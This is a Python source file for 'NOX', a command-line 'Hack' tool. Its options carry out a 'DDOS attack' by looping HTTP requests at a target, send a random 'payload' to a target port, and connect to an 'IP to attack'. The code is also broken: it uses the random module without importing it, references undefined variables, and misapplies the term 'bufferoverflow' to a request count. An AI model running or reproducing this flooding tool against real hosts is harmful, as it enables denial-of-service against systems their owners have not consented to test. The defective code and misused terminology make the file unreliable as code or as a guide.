# NOX by Coco de Vienne
# This software is licensed under the DVF GPL
# VERSION 2017.0

try:
    import argparse, socket, sys, requests
except Exception as error:
    print("Could not load some modules!")

class Hack:
    def assert_num(self, num):
        try:
            int(num)
            return 0
        except Exception as error:
            return 1
            
    def gen_payload(self):
        abc = "abcdefghiklmnopqrstuvwxyz"
        digits = "1234567890"
        alph = list(abc)
        nums = list(digits)
        fusion = alph + num
        pllist = []
        for i in range(1,101):
            item = random.choice(fusion)
            pllist.append(item)
        payload = "".join(pllist)
        return payload
    
    def do_ddos(self, ip, bufferoverflow):
        if self.assert_num(bufferoverflow) == 0:
            bo = int(bufferoverflow)
            rend = bo + 1
            try:
                for i in range(1,rend):
                    urlobj = requests.get(ip)
            except Exception as error:
                print("[*] Error while processing the buffer!")
        else:
            print("[*] Error while processing the buffer!")
    
    
    def send_payload(self, myip, port):
        sock_object = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip = socket.gethostbyname(myip)
        print("[*] Connecting to IP " + str(ip))
        print("[*] Accessing IP " + str(ip) + " from port " + str(port))
        try:
            sock_object.connect((ip, port))
            print("[*] Sending payload to IP " + str(ip))
            payload = self.gen_payload()
            sock_object.send(payload)
            print("[*] Closing connection.")
            sock_obj.close()
            print("[*] Terminating process.")
        except Exception as error:
            print("[*] The request could not be processed!")
            print("[*] Exiting.")
            sys.exit()
            
    def connect(self, myip, port, bytes):
        sock_object = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip = socket.gethostbyname(myip)
        print("[*] Connecting to IP " + str(ip))
        print("[*] Accessing IP " + str(ip) + " from port " + str(port))
        try:
            sock_object.connect((ip, port))
            print("[*] Waiting for response from IP " + str(ip))
            response = sock_object.recv(bytes)
            print(response)
            print("[*] Closing connection.")
            sock_obj.close()
            print("[*] Terminating process.")
        except Exception as error:
            print("[*] The request could not be processed!")
            print("[*] Exiting.")
            sys.exit()
        
        
class Main:
    def run(self):
         hack = Hack()
         parser = argparse.ArgumentParser()
         parser.add_argument("-v", help="displays program version", action="store_true")
         parser.add_argument("-l", help="displays program license", action="store_true")
         parser.add_argument("-IP", help="IP to attack")
         parser.add_argument("-port", help="port of server to attack")
         parser.add_argument("-bo", help="bufferoverflow to use")
         parser.add_argument("-b", help="bytes to receive")
         parser.add_argument("--ddos", help="executes a DDOS attack on target", action="store_true")
         parser.add_argument("--connect", help="attempts a connection to the target", action="store_true")
         parser.add_argument("--pay", help="sends a payload to the target", action="store_true")
         args = parser.parse_args()
         if args.v:
             version = 2017.0
             print("NOX " + str(version))
         elif args.l:
             license = "This software is licensed under the DVF GPL."
         elif args.pay and args.IP and args.port:
             hack.send_payload(args.IP, args.port)
         elif args.connect and args.IP and args.port and args.b:
             hack.connect(args.IP, args.port, args.b)
         elif args.ddos and args.IP and args.bo:
             hack.do_ddos(args.IP, args.bo)
         else:
             print("No valid combination of argumemts supplied.")

def main():
    inst = Main()
    inst.run()

if __name__ == "__main__":
    main()